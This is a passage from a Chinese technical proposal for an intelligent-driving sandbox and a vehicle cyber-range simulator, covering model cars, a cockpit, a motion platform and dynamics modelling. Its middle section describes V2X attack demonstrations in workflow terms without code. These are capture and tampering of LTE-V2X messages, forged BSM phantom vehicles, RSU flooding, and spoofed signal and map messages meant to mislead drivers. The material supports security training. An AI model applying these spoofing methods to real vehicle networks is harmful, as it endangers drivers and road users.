title="功能实施方案"></a>功能实施方案</h5><p>功能参数方案如下：</p><ol><li>沙盘的尺寸技术方案：沙盘尺寸3米*4米，满足车辆多场景运行。可根据实际设计方案调整。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4a199f64848d5818f21041d21e33c57e.jpeg" alt="DSC_0014">同类智能驾驶沙盘示例</p><ol><li>主要静态场景技术方案：沙盘的主要场景有住宅、树木、草坪、路灯等装饰部分组成。装饰建筑由PVC板、亚克力板等组成。沙盘的装饰部分需展现城市的主要静态场景，包括住宅、树木、草坪和路灯等元素。这些装饰建筑应由耐用且质轻的材料如PVC板和亚克力板等组成，以确保场景的真实性和持久性。这些材料的选择不仅能使沙盘外观更加美观，还能增强其耐用性，使其能够承受日常使用中的磨损和气候变化。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1398f44c6fd7996a161dccd22f51c688.png" alt="微信截图_20230914203857"></p><ol><li>沙盘电源系统技术方案：可使用220VAC 50ZH市电输入，无需单独设置配电线路。内部配电5V 12V 24V等安全电压，总功率1200w。设置定时断电保护器。</li><li>沙盘的底座技术方案：沙盘制作做采用木质框架木板、钢化玻璃作为围挡，底盘平面采用实木白松板材制作龙骨框加上面平铺高密度板或高分子细木工板下方制作支撑点。底座总高度为700mm。底盘采用防火、阻燃、防蛀、耐变形的材料，选用的底板材料：防火板、高密度板和高分子有机复合板。整个台架为多个部分组成，方便拆分和搬运，外观使用烤漆处理。总质量2000KG。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dff5fef20a6d00a5f0b18a57fa4dd29e.png" alt="微信截图_20230914203802"></p><ol><li>固定交通标志技术方案：可以设置固定标志及可变标志（由屏幕组成），用于交通标志识别训练，识别到限速标志，进行速度切换，见到转弯或直径标志，根据标志进行相应的运动行为操作。并可以根据标志进行动作编程。可变标志联网并可控。</li><li>沙盘易损件技术方案：提供沙盘易损件，满足极限365天*8小时运行需求，随时有用的易损件。</li><li>沙盘服务器技术方案：沙盘服用器使用INTEL高性能主机，i5 8GRAM 256G固态+1TB 工控机。485控制板，串口控制器等电路，PLC系统。对外提供访问接口，对内连接各个模块和小车，用于同步数据和控制。第三方设备和开发者可以通过网络接口访问服务器，获得沙盘实时的状态和车辆信息，并且可以直接控制上述交互模块。</li><li>红绿灯控制功能技术方案：路口由多种形式的红绿灯组成，车辆行驶时，通过摄像头识别前方红绿灯包括人行道红绿灯，车道红绿灯，计时器等。红绿灯模块连接服务器，可以自动运行，也开放接口可以进行编程操作，用于实验智慧交通控制，根据车流量来自定义调整红绿灯时间。让小车顺利通过。</li><li>智慧灯光功能技术方案：沙盘路灯，建筑物装置灯等，均可以通过接口进行控制亮灭。并且沙盘上有多处灯光装饰的建筑物，可以自由定义演示颜色，明暗，闪动频率等，每处灯光都可单独控制，可根据场景需要分别亮起。显示丰富多彩的沙盘实景效果。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0e4010e76270f357818eb9111b68e5e.png" alt="微信截图_20230914203920"></p><ol><li>数字化大屏显示功能技术方案：根据需要，数字化大屏显示功能能够实时展示沙盘的运行状态和关键数据。根据用户需求定制，大屏幕上可以显示各小车的位置、路径规划、交互状态等信息，为观察者提供直观的沙盘动态。</li><li>二次开发和三方通讯接口功能技术方案：沙盘上各个交互模块及相关数据均可以同步共享到服务器。可以通过接口，二次开发需要的功能，也可以连接第三方设备用于丰富沙盘功能。可根据第三方设备类型设置通讯接口。</li></ol><h4 id="小车性能参数技术方案"><a href="#小车性能参数技术方案" class="headerlink" title="小车性能参数技术方案"></a>小车性能参数技术方案</h4><h5 id="功能实施方案-29"><a href="#功能实施方案-29" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>智能小车是一款自动驾驶小车。本智能小车可以进行拆装。本小车通过搭载激光雷达和双目相机，将最前沿的深度学习、图像识别、SLAM 等技术应用到小车上。激光雷达小车 包括了所有传统 无人驾驶小车的功能，包括图像自动跟随、目标识别、SLAM 构图导航，激光雷达小车 可以通过 SLAM（同步定位和映射）算法来生成室内地图，在手机上可以预览到实时的地图并可通过在手机地图上点击地图上任意一点来控制 激光雷达小车 自动运行到目标地点。通过图像跟随技术，小车可以跟随任意一个目标运动。</p><ol><li>外形尺寸方案：长度18cm，宽度12cm，高度15cm(含支架及雷达高度)，多种驱动结构：</li><li>小车选用两轮驱动方式，通过差速实现转向。同时配备了专用电机及驱动器，速度可调。电机最大功率3W，电机编码器选用是磁编码器，支持AB双路输出。重量：1.2kg。</li><li>数量：演示车辆9辆。</li><li>传感器：包含一个单线激光雷达，8米测量半径，包含一个深度摄像头，普通摄像头，尝试摄像头可以输出1280*720深度图，包含一个双目摄像头，双目摄像头(须同时输出rgb图和深度图，像素1280*720，有效距离为0.6m-4m)，等于一个探头，配备超声波传感器，用于近距离的障碍物检测和避障。</li><li>驱动器：板载2-4路大功率电机驱动。最大驱动电流等于7A；最高支持24V电压输入。</li><li>电源：使用大容量动力锂离子电池自带12.6v，7800mAH锂电池，运行时间1.5小时，充电时间2.5小时，配套智能充电器。同时有对外放电能力。可以提供12V和5V的供电接口用来扩展其它设备。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d804075de79fd6033897c7c871aec15f.png" alt="微信截图_20230914201834"></p><ol><li>上位机支持ROS,预留接口为USB。同时，主板提供普通IO，PWM。支持ROS（Robot Operating System），为用户提供统一的软件平台，方便进行软件开发和功能扩展。同时，预留USB接口，以便于数据传输和设备连接。</li><li>控制板是小车的核心部分，具备丰富的接口和功能。具体来说，应包含通讯串口引出，方便与其他设备进行通信；独立9轴IMU模块，包括三轴陀螺仪、三轴加速度计和三轴磁力计，用于姿态和方向感知；电源转换模块，最大可输出5V、5A的稳定电压，为其他模块提供稳定的电力供应；USB接口，用于数据传输和设备连接；烧写口和串口引出，方便进行程序升级和调试；可扩展多路超声波、IIC、SPI接口，支持多种传感器接入；无线遥控手柄接口，可接无线手柄进行远程操控；具备短路保护、TVS防护和保险丝防护功能，提高设备的安全性；12位高速ADC，用于高精度模拟信号转换；支持CAN通讯，以适应各种复杂的通信需求；支持LCD接口，方便用户进行可视化操作和数据显示。此外，需提供设计原理图截图证明，功能模块绘制方式采用层次原理图，以确保设计的合理性和可扩展性。控制板功能及设计原理图截图证明，功能模块绘制方式采用层次原理图，如下表。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9f5c4636534840a8abbe6bc156be4bdd.png" alt="IMG_256"></p><table><thead><tr><th>通讯串口引出。 独立9轴IMU模块，三轴陀螺仪，三轴加速度计，三轴磁力计。 电源转换，最大5V 5A输出。 USB接口。 烧写口，串口引出。 可扩展多路超声波，IIC，SPI接口。 无线遥控手柄接口，可接无线手柄。 短路保护，TVS防护，保险丝防护。 12 位高速 ADC 。 支持CAN通讯 。 支持 LCD 接口。</th></tr></thead><tbody><tr><td><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3e80526303c0369fa9c4b148be1ccce9.png" alt="微信截图_20230914202146"></td></tr><tr><td><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4a50aeb60723e9750e5347694c189b83.png" alt="微信截图_20230914202038"></td></tr><tr><td></td></tr></tbody></table><ol><li>自动行驶功能：在界面上选择目标点后，小车会自发出，到达目标点，然后根据脚本，选择执行任务或自动返航。行驶途中遇到突发情况，小车会根据脚本切换路线继续完成任务；</li><li>自动避障功能：小车在行驶过程中前方出现障碍物或其它小车时，使用超声波探测到后会自动在障碍前采取自动紧急刹车，绕道而行；</li><li>红绿灯识别功能：智能小车在行进中，通过摄像镜头识别前方红绿灯，根据红绿灯执行红灯停，绿灯行的操作，黄灯时会减速；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7ed8bf315aef633e235b0e127580c01a.png" alt="微信截图_20230914203816"></p><ol><li>自动跟车功能：前方有车辆时，会保持一定的速度跟着前方的小车，识别与前车距离过近自动停止。前车停后车停，前车走后车走。采用超声波测距加图像识别测距方法；</li><li>行人识别功能：人行道有行人时，车辆识别到行人时会主动停止，避免与行人发生碰撞。使用人工智能和视觉处理自动识别出行人并框出。识别采用图像识别+深度学习等方式；</li><li>低电量功能：小车电量较低时，可以通过降速主动进行自动连接充电桩并进入充电模式。但电量不满足出发条件时，会拒绝上位机发来的出发任务，确保提供多辆演示车辆来满足整体运行不停摆；</li><li>自主定位功能：在行车道下面预埋定位器，使用激光雷达和地图和AMCL算法，算出自己位置，并上报给服务器。智能小车配备先进的自主定位功能。通过激光雷达的精确测量，小车能够实时计算出自身在沙盘上的准确位置，并将位置信息上报给服务器。这一功能将确保小车在行驶过程中的定位精度和稳定性，为后续的路径规划和导航提供可靠的数据支持。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/99266cfe782f0e00a2e1267f78667b71.png"></p><p>雷达dingwec</p><ol><li>前方车辆车距保持功能：小车识别前方车辆模型，前方车辆可以遥控或自动行驶。识别与前车距离，距离过近时后车主动降速跟随，如果前车停止行驶后车自动停止。采用超声波测距，图像识别测距等多模测距方法；</li><li>数据交互功能：沙盘上所有小车的数据都会使用无线WIFI传给服务器，并由服务器发送给其它软件进行处理，用于数字孪生，大屏展示等。同时可以用触屏发出数据指令到服务器，服务器在传给小车，达到双向数据交互功能。</li><li>中控管理软件：可以将数据实时显示在大屏上，包括车辆第一视角，实时将小车看到的场景投屏到指定的一屏幕上。屏幕上可以实时显示小车所看到的影像及二值化处理的两个视频图像，车辆位置，电量及状态等，显示内容可以定义；</li><li>小车系统完全开源，支持标准C语言，C++以及Python编程，提供机器人基本算法源代码。小车系统完全开源，并使用C语言、C++或Python等主流编程语言进行开发。机器人基本算法的源代码方便用户根据自身的需求进行二次开发和功能扩展。这一举措将有效降低用户的开发成本和时间投入，提升整体的开发效率和灵活性。</li></ol><h3 id="智能驾驶网络安全场景"><a href="#智能驾驶网络安全场景" class="headerlink" title="智能驾驶网络安全场景"></a>智能驾驶网络安全场景</h3><p>本方案支持攻击演示场景包括：伪冒车辆权限攻击、篡改V2X消息进行虚构车辆攻击、假冒道路流动车辆数据攻击、车路通信干扰等场景。</p><p>本方案支持各种攻击场景，其中主要攻击演示场景包括：</p><ul><li>伪冒车辆权限攻击</li><li>篡改V2X消息进行虚构车辆攻击</li><li>假冒道路流动车辆数据攻击</li><li>车路通信干扰</li></ul><h4 id="伪冒车辆权限攻击场景方案"><a href="#伪冒车辆权限攻击场景方案" class="headerlink" title="伪冒车辆权限攻击场景方案"></a>伪冒车辆权限攻击场景方案</h4><h5 id="功能实施方案-30"><a href="#功能实施方案-30" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>本方案支持数据捕获配置工具完成初始化配置，对OBU（攻击）捕获到的LTE-V2X消息发送的目的ip及端口进行配置，数据捕获配置OBU中持久化保存，捕获功能默认开启；</li></ol><p>本方案配有数据捕获配置模块，该模块的功能是支持配置数据捕获工具配置ip和端口号，用户在捕获数据前可用捕获配置工具进行初始化配置，配置成被攻击OBU的ip及端口，用OBU（攻击）捕获到发送到目的ip及端口的LTE-V2X消息，支持数据捕获配置OBU中数据信息进行持久化保存，配置完成后默认捕获功能开启。下图有数据捕获时序图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d74ad96db1acc92e0698440720eef180.emf"></p><ol><li>本方案支持OBU（攻击）捕获到LTE-V2X网络消息后根据数据捕获工具的配置信息发给PC，Wireshark通过网卡抓包将LTE-V2X可视化的展示出来，并保存为pcap文件；</li></ol><p>本方案支持查看捕获到数据、保存捕获数据等功能，用户可以用数据捕获工具使OBU（攻击）捕获LTE-V2X网络消息，并把捕获的消息根据数据捕获工具的配置信息发给相应的PC，Wireshark通过网卡抓包，把抓到的数据包进行解析，数据捕获分析工具支持可视化的展示，下图是Wireshark抓包界面，并且支持数据包多种保存格式，其中保存pcap格式文件为主。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6776c4dc9f319c57b5f1c06bdee19de7.png"></p><ol><li>本方案支持攻击辅助工具将pcap文件中的每个数据包中的紧急车辆字段篡改为紧急车辆标书数值，再通过WiFi网络发给OBU（攻击），最后OBU（攻击）再将篡改后的LTE-V2X消息广播到PC5网络中。</li></ol><p>本方案支持对捕获的数据进行篡改功能，用户可以用这个功能把捕获的BMS消息进行篡改，如把失控车辆字段篡改为失控车辆数字，支持数据捕获编辑模块保存篡改的数据，如保存成pcap文件等，通过有线网络或无线网络把pcap文件发给OBU（攻击），最后OBU（攻击）再用V2X接口把篡改后的LTE-V2X消息广播到PC5网络中。下图有上述功能时序图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d74ad96db1acc92e0698440720eef180.emf"></p><h4 id="虚构车辆攻击场景方案"><a href="#虚构车辆攻击场景方案" class="headerlink" title="虚构车辆攻击场景方案"></a>虚构车辆攻击场景方案</h4><h5 id="功能实施方案-31"><a href="#功能实施方案-31" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>本方案支持配置工具开启OBU（攻击）的位置模拟开关，OBU（攻击）可以将记录的车辆历史轨迹信息加到LTE-V2X消息中进行发送；</li></ol><p>本方案配有位置信息模拟模块，支持配置工具模拟位置信息功能，用户通过记录道路中车辆位置信息，保存道路信息记录，添加其他车辆数据信息，生成相应的BSM消息，把模拟生成BSM消息通过OBU（攻击）发送到V2X网络中。下图是车辆的OBU发送BSM消息模拟图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ad417d1511831ca29e12b86a0f3bcc91.png"></p><ol><li>本方案支持主车在收到伪冒的BSM消息后，HMI显示出周边有车辆存在，对驾驶员产生误导。</li></ol><p>本方案有模拟位置信息功能，用户可以用模拟位置信息功能发送模拟位置信息，主车在V2X网络收到伪冒的BSM消息，车机显示屏显示出周边有车辆存在信息，并产生相应预警信息，对驾驶员产生误导，影响车辆驾驶员正常驾驶车辆。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ad417d1511831ca29e12b86a0f3bcc91.png"></p><h4 id="假冒道路流动车辆数据攻击场景方案"><a href="#假冒道路流动车辆数据攻击场景方案" class="headerlink" title="假冒道路流动车辆数据攻击场景方案"></a>假冒道路流动车辆数据攻击场景方案</h4><h5 id="功能实施方案-32"><a href="#功能实施方案-32" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>本方案支持发布虚拟的BSM消息伪造道路上的流动车辆，导致RSU上传错误的车辆信息和数据；</li></ol><p>本方案支持大规模模拟车辆数据信息功能，用户可以用这个功能，模拟大规模车辆信息，每个被模拟的虚拟车辆会生成实时BSM消息，通过V2X网络发布这些虚拟车辆的BSM消息，伪造道路上的车辆信息，照成道路拥堵假象，导致RSU上传错误的车辆信息和数据。</p><ol><li>本方案支持通过模拟大量的BSM消息并高频次的发送，对RSU进行拥塞式的攻击。</li></ol><p>本方案支持大规模模拟车辆数据信息功能，用户可以用这个功能，模拟大规模车辆信息，每个被模拟的虚拟车辆会生成实时BSM消息，通过V2X网络发布这些虚拟车辆的BSM消息，伪造道路上的车辆信息，并且支持高频次的发送虚拟车辆的BSM消息功能，对RSU进行拥塞式的攻击。</p><h4 id="伪冒RSU消息攻击"><a href="#伪冒RSU消息攻击" class="headerlink" title="伪冒RSU消息攻击"></a>伪冒RSU消息攻击</h4><h5 id="功能实施方案-33"><a href="#功能实施方案-33" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>本方案支持配置工具截取真实RSU发出的V2X消息，包括SPAT、MAP、RSI、RSM消息；</li></ol><p>本方案支持截取V2X数据功能，支持截取SPAT、MAP、RSI、RSM等RSU发出的V2X消息，V2X用PC5和Uu接口通信，PC5接口是车的模组和 车、路侧设备、人交互的接口。使用V2X业务UE之间用户面进行D2D（Device to Device）直接通信的接口。Uu接口：是车辆和基站的空口通信，uu口遵循3gpp LTE/5G 的协议。用V2X数据截取功能在PC5和Uu接口截取真实RSU发出的V2X消息，包括SPAT、MAP、RSI、RSM消息。</p><ol><li>本方案支持攻击工具对截获的V2X消息进行可视化展示，并进行可视化编辑，构建伪冒消息；包括篡改信号灯信息、篡改地图信息等；</li></ol><p>本方案支持篡改V2X数据功能，用户可以在V2X网络截取的V2X消息，并用可视化工具显示截取的V2X消息，支持把截取的V2X消息解析不同的数据格式，包括Lua、json等数据格式，支持可视化编辑截取的V2X消息，达到篡改和伪冒V2X数据的目的，支持篡改信号灯信息、篡改地图信息等。</p><ol><li>本方案支持通过篡改V2X消息，发布虚假的信号灯信息、道路预警信息等给驾驶员产生干扰；</li></ol><p>本方案提供V2X编辑和V2X通信功能，用户可以在V2X网络截取的V2X消息，并用可视化工具显示截取的V2X消息，支持把截取的V2X消息解析不同的数据格式，包括Lua、json等数据格式，支持可视化编辑截取的V2X消息，达到篡改和伪冒V2X数据的目的，把篡改和伪冒V2X数据的发布到V2X网络中，支持发送虚假的信号灯信息、道路预警信息等，影响驾驶员正常驾驶，给驾驶员驾驶车辆产生干扰。</p><h1 id="智能汽车网络靶场动态仿真系统"><a href="#智能汽车网络靶场动态仿真系统" class="headerlink" title="智能汽车网络靶场动态仿真系统"></a>智能汽车网络靶场动态仿真系统</h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>智能汽车网络靶场动态仿真系统，提供智能驾驶虚拟仿真，系统结合人车路环境实时仿真系统，同步采集驾驶模拟器数据、驾驶模拟环境数，实现多种智能驾驶场景，能够完成与靶场演示场景联动。</p><h2 id="技术路线-3"><a href="#技术路线-3" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="驾驶舱"><a href="#驾驶舱" class="headerlink" title="驾驶舱"></a>驾<strong>驶舱</strong></h3><h4 id="功能与性能参数需求-1"><a href="#功能与性能参数需求-1" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h4><ol><li>仪表盘和操作台应采用Glass Cockpit概念的图形仪表盘和操作板。可以显示适用的图形仪表盘及中央仪表板GUI。仪表盘UI采用LCD显示器,使无人驾驶车辆的体现和数字信息的显示、多种集群设计的体现不受限制；</li><li>仪表显示屏至少10寸，分辨率720P以上，对比度700:1,12V直流供电；</li><li>仪表显示内容包含速度、转速、温度/警告、发动机/电池故障、驾驶信息、AVN信息。</li></ol><h4 id="功能实施方案-34"><a href="#功能实施方案-34" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>实现智能汽车网络靶场动态仿真系统的驾驶舱功能，首先，使用Glass Cockpit概念的图形仪表盘和操作板，以实现现代化的驾驶舱界面。该系统界面可以显示适用的图形仪表盘和中央仪表板GUI，提供直观的信息展示和操作界面。实现了无人驾驶车辆的体现和数字信息的显示，采用LCD显示器作为仪表盘UI的显示设备，LCD显示器具有高分辨率和色彩鲜艳的特点，可以清晰地展示驾驶相关的信息，包括车速、转速、油量、电池状态等。同时，LCD显示器还可以显示导航地图、多媒体内容和车辆状态等数字信息，提供丰富的信息展示功能。该系统满足多种集群设计的体现不受限制，在仪表盘和操作板上设计可定制的界面，允许用户根据自己的喜好和需求进行个性化的设置和布局。这样，驾驶员可以根据实际情况选择不同的仪表盘样式和显示内容，以满足不同驾驶场景和偏好的要求。综上所述，通过采用Glass Cockpit概念的图形仪表盘和操作板，以及使用LCD显示器作为仪表盘UI的显示设备，可以实现智能汽车网络靶场动态仿真系统的驾驶舱功能。这个系统可以展示适用的图形仪表盘和中央仪表板GUI，同时提供无人驾驶车辆的体验和数字信息的显示，以及多种集群设计的体现，为用户提供全面而直观的驾驶体验。</li></ol><p>模拟座舱由接近实车的驾驶室、电路控制等组成。模拟座舱是本系统的关键设备之一，采用通用驾驶舱，操作件除变速器外都采用原车件。座舱为全功能模拟座舱，操作感与实车的相似性是关键，具有噪声小、无污染、能耗低和便于安装、维修等优点，基本结构如下：</p><ul><li>座舱基本框架包括驾驶室、仪表、座椅、上下支架等；</li><li>转向机构总成</li><li>转向机构总成是用于控制模拟汽车行驶方向和传递模拟路面反馈力的装置。它由实车件（方向盘、点火开关、组合开关、护罩）、电动反力矩伺服系统组成，方向盘选用原车配件，安装位置和尺寸与被模拟的特定车辆相同，如所示。电动反力矩伺服系统转动过程中，方向盘能产生与真车相符的转动阻力，在相应场景中能出现对应的阻尼力与抖动力。</li><li>变速器总成</li></ul><p>变速器总成是用于改变模拟汽车行驶速度和倒车的装置，它由变速器、挡位传感器、电子离合装置等组成。模拟实车解放 1125 变速杆设计，用于模拟不同车型的挡位设置，根据车型选择的变化，呈现不同挡位。</p><p>电子离合装置是用于控制离合器踏板与变速器锁止机构的装置，可实现受离合器踏板控制的变速器挡位锁止功能，不踏下离合器踏板无法移动变速杆。</p><ul><li>踏板组总成</li></ul><p>踏板组总成结构见图所示，根据图示踏板包括踏板信号反馈板 1、上支架 2、磁铁座 4、磁铁 5、脚踏板 6、固定板 8、下支架 9、下活动管 10、上活动管 11、弹簧 12 和踏板连杆 13。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/545c261df6124eda53584a03d523a06d.jpeg"></p><ul><li>驾驶室面板</li></ul><p>驾驶室面板包括仪表和开关，分别用液晶显示屏和触摸屏输出和输入。虚拟模拟仪表能实时指示或显示被模拟的实装运行参数，符合实装上真</p><p>实仪表的动态与静态性能指标，表盘结构与指示和真实仪表一致。</p><ul><li>测控系统部件</li></ul><p>测控系统部件主要用于通过软件调用测定与驾驶有关的各操作部件的状态和数据，包括离合器、脚制动、油门、变速器、方向盘、手制动、手操作触摸屏等各种操作状态数据。根据不同操作采集的数据特性不同，采取不同的传感器进行采集。其中离合器、脚制动、油门、手制动可利用电位器获取某一操作的角度变化量。采用角传感器获取方向盘的角度转动量；变速器采用开关量确定所处的挡位；手与触摸屏空间关系位置使用红外光学定位。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c93291dccee677bc9c49869c4c6977bb.png"></p><ul><li>离合器踏板、脚制动踏板、加速踏板及扩展部件和手制动；</li><li>仪表盘和操作台应采用Glass Cockpit概念的图形仪表盘和操作板。可以显示适用的图形仪表盘及中央仪表板GUI。 仪表盘UI采用LCD显示器,使无人驾驶车辆的体现和数字信息的显示、多种集群设计的体现不受限制；</li></ul><ol><li>选择10英寸且支持12V直流供电的的LCD显示屏，该显示屏具有1080P的分辨率和700:1的对比度。显示屏能够提供清晰的图像和良好的对比度，以确保驾驶员可以准确地读取和理解显示的信息，可以与车辆的电气系统兼容，方便供电和安装。</li><li>仪表显示屏将提供驾驶员全面的车辆状态和驾驶相关信息，主要包含速度、转速、温度/警告、发动机/电池故障、驾驶信息、AVN信息等。它将显示当前车辆的速度和发动机转速，让驾驶员了解车辆的行驶状态和发动机的工作情况。此外，温度和警告信息将提醒驾驶员注意车辆的健康状况，如发动机温度和低油量等。如果发生发动机或电池故障，相应的故障代码或警告将显示在屏幕上，以便驾驶员及时采取措施或寻求维修。驾驶信息方面，屏幕将显示驾驶模式、巡航控制状态和雨刷状态等，以帮助驾驶员更好地控制车辆。最后，AVN信息将提供多媒体和导航功能，包括音乐播放、导航地图和电话通信等，为驾驶过程中的娱乐和导航提供便利。通过这些信息的显示，驾驶员将能够全面了解车辆的状态和驾驶相关信息，从而更安全、便利地驾驶车辆。</li></ol><h3 id="运动平台"><a href="#运动平台" class="headerlink" title="运动平台"></a>运动平台</h3><h4 id="功能与性能参数需求-2"><a href="#功能与性能参数需求-2" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h4><ol><li>支持3自由度；</li><li>支持俯仰、滚转、上下平移；</li><li>俯仰最大行程不低于正负5 deg，运动速度不低于15 deg/s；</li><li>滚转最大行程不低于正负5 deg, 运动速度不低于20 deg/s；</li><li>上下平移最大形成不低于正负0.07 m,运动速度不低于0.2 m/s；</li><li>负载不低于300kg；</li><li>配备紧急停止按钮；</li></ol><h4 id="功能实施方案-35"><a href="#功能实施方案-35" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>下图是运动平台的基本实物模型：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6b06456983b3cdad5bef7e6262ab1522.png"></p><ol><li>该平台通过三个不同轴的支撑，具备3个自由度的运动能力，可以在三个方向上进行运动和调整。三自由度平台系统由该机构的三自由度运动平台、计算机控制系统、驱动系统等组成。下平台安装在地面的固定基座基上，上平台为支撑平台。计算机控制系统通过协调控制电动缸的行程，实现运动平台的三个自由度的运动。计算机控制系统硬件：运动控制计算机（伺服控制单元）：实现平台系统启动/停止、接 收上位机发来的位姿控制信息、对电动缸进行运动控制、监控伺服电机驱动器的工作状态、 监控系统的运动状态、完成故障处理以及安全保护工作。信号调理单元：完成与平台系统运动状态相关的各种传感器信号、测试信号和数字 I/O 信号的调理，以及伺服驱动器的驱动等。</li><li>通过计算机控制系统驱动不同轴和铰链，以实现平台支持俯仰、滚转和上下平移的运动方式，可进行车辆在垂直和水平方向上的灵活调整和平移。上下运动平台：上平台，连接需要被模拟动作的机构。上铰链，双回转轴的虎克铰结构，用于连接上平台与电动缸的活塞杆。下铰链，单虎克铰结构，用于连接固定基座与电动缸的筒体。下平台可安装固定基座。</li><li>通过计算机控制系统对硬件进行控制，可以精确的设定平台运动行程，该平台可实现俯仰最大行程正负5 deg，运动速度15 deg/s。</li><li>通过计算机控制系统对硬件进行控制，可以精确的设定平台运动行程，该平台可实现滚转最大行程正负5 deg，运动速度20 deg/s。</li><li>通过计算机控制系统对硬件进行控制，可以精确的设定平台运动行程，该平台可实现上下平移最大形成正负0.07 m,运动速度0.2 m/s。</li><li>该平台是用三个独立轴进行支持，通过计算机控制系统进行控制，平台整体负载可达300kg。</li><li>平台撇被紧急停止按钮，在发生任何紧急情况或需要人为停止时，均可通过急停按钮进行快速停止。</li></ol><h3 id="车辆动力学模型"><a href="#车辆动力学模型" class="headerlink" title="车辆动力学模型"></a>车辆动力学模型</h3><h4 id="功能与性能参数需求-3"><a href="#功能与性能参数需求-3" class="headerlink" title="功能与性能参数需求"></a>功能与性能参数需求</h4><ol><li>模型能够支持和实现车辆动力学主要模块。</li><li>实现模型、数据、仿真和结果的管理；</li><li>内嵌自动化测试工具和脚本工具（支持前处理和后处理）；</li><li>支持根据车辆模型的运动方程，利用三维刚体的线运动量和角运动量，选取所需自由度的车辆模型，建立运动方程，开发基于多体动力学的车辆模型；</li><li>支持根据模块分别开发悬架装置、轮胎、转向、防滑杆等底盘构成组件。</li></ol><h4 id="功能实施方案-36"><a href="#功能实施方案-36" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>方案构建了一个全面的、经过精确校验的车辆动力学模型，能够精准模拟车辆在不同工况下的动态行为。应用一种创新的场景软件和项目管理工具，提供了全方位的模型、数据、仿真和结果管理功能。软件特有的内嵌自动化测试工具和脚本工具。在车辆模型的运动方程方面，采用了独特的三维刚体线运动量和角运动量方法，能够选取特定自由度的车辆模型和建立相应的运动方程。</p><ol><li>车辆动力学模型是实现车辆动力学行为的关键模块。它基于车辆结构、质量分布、轮胎特性和动力系统等因素，以及牵引、制动和转向等控制输入，计算车辆的加速度、速度和位置等参数。车辆动力学模型包括纵向和横向动力学模型。纵向模型考虑牵引力、阻力、负载和动力系统特性，描述车辆的加速度和速度变化。横向模型关注车辆的转向行为和侧向力，考虑轮胎特性、悬挂系统和车辆结构。实现车辆动力学模型需要传感器数据，如车速、转速、方向盘角度和制动压力。这些数据作为输入，经过计算和建模，得出车辆的动力学行为和状态。同时，考虑路面状况、风速和坡度等环境条件，提高模型准确性。该模型不仅支持实现车辆动力学的核心模块，还能确保各模块间的协同工作，模拟车辆的实际动态行为，为研究和开发提供坚实基础。</li><li>车辆动力学模型的实现涉及模型、数据、仿真和结果的管理。首先，模型的实现需要定义数学和物理模型，并基于实际车辆参数进行参数化和校准。模型可以使用编程语言或仿真软件实现，并进行版本控制和文档化，以便于管理和维护。数据的管理包括收集、处理和存储传感器数据，如车速、转速和方向盘角度。数据采集系统可以与车辆的电子控制单元（ECU）或传感器接口进行集成，以实时获取数据。处理和存储数据可以使用数据库或文件系统，确保数据的完整性和可访问性。仿真是通过模型和数据进行计算和预测车辆的动力学行为。仿真平台可以使用专门的仿真软件或自行开发的仿真引擎。在仿真过程中，模型和数据被加载和调用，仿真参数和初始条件被设置，模拟车辆的运动和响应。仿真结果的管理包括结果的记录、分析和可视化。仿真结果可以包括车辆的加速度、速度、位置和其他关键参数。这些结果可以存储在数据库或文件中，并进行后续分析和比较，以评估